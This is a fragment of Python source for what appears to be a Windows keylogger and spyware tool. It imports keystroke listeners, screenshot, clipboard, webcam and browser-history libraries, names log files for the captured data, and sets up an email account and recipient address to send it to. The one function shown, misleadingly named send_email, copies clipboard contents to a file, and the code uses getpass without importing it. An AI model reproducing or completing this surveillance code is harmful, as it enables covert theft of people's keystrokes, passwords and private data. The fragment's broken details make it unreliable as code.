from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
import pyscreenshot
from pynput import keyboard 
from pynput.keyboard import Listener
import subprocess
import os
import cv2
import time
import browserhistory as bh
import win32clipboard, logging, pathlib

keys_information = "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
# audio_information = "audio.wav"
screenshot_information = "screenshot.png"


email_address = " " # Enter disposable email here
password = " " # Enter email password here

username = getpass.getuser()

toaddr = "justforproject@gmail.com" # Enter the email address you want to send your information to

file_path = "C:/Users/sharm/logsss" # Enter the file path you want your files to be saved to
extend = "\\"
file_merge = file_path + extend

def send_email(path):  
      win32clipboard.OpenClipboard()
      pasted_data = win32clipboard.GetClipboardData()
      win32clipboard.CloseClipboard()
      with open(file_path + 'clipboard_info.txt', 'a') as clipboard_info:
        clipboard_info.write('Clipboard Data: \n' + pasted_data)

        